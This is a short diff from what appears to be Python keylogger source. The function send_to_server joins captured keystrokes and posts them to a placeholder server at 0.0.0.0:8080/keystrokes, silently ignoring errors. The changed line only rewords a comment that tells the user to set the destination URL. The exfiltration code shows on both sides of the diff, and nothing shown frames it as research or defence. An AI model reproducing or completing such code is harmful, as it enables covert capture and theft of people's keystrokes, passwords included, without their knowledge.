@@ -28,7 +28,7 @@ def send_to_server():
     if keys:
         data = {"keys": ''.join(keys)}
         try:
-            requests.post("http://0.0.0.0:8080/keystrokes", data=data) # Change the IP address 
+            requests.post("http://0.0.0.0:8080/keystrokes", data=data) # Change the URL
         except:
             pass  
         
